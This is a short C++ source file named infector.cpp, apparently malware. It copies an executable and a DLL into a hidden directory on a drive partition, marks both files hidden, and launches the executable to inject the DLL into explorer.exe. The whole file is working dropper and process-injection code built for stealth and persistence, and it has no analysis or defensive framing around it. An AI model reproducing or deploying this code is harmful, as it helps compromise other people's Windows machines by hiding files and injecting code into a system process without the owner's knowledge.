// infector.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <Windows.h>
#include "utils.h"

#define INJECT_EXE "reject_mother.exe"
#define INJECT_DLL "private_dll.dll"



int _tmain(int argc, _TCHAR* argv[])
{
	char currentFilePath[512] = { 0 };
	std::string current_path_prefix;
	GetModuleFileName(NULL, currentFilePath, sizeof(currentFilePath));
	DRV_LIST drvs = get_partitions();
	std::string infect_path;
	std::string command;
	std::string tmp;
	char strcmd[512] = { 0 };
	if (drvs.size() >= 2)
	{
		infect_path = drvs[1].drive_name;
	}
	else
	{
		infect_path = drvs[0].drive_name;
	}
	current_path_prefix = getpath_prefix(currentFilePath);
	infect_path += "6489\\";

	create_hidden_dir(infect_path);
	


	command = "xcopy /y /q /h .\\";
	command += INJECT_EXE;
	command += "  ";
	command += infect_path;
	execute_command((char *)command.c_str());

	command = "xcopy  .\\";
	command += INJECT_DLL"  ";
	command += infect_path;
	command += "  /y /q /h";
	printf("command: %s \n", command.c_str());
	execute_command((char *)command.c_str());
	tmp = infect_path;
	tmp += INJECT_DLL;
	setFileHidden((char *)tmp.c_str());
	tmp = infect_path;
	tmp += INJECT_EXE;
	setFileHidden((char *)tmp.c_str());

	tmp = infect_path;
	tmp += INJECT_DLL;
	tmp += "  explorer.exe";

	//run exe
	start_exe(tmp, tmp);

	
	system("pause");
	return 0;
}

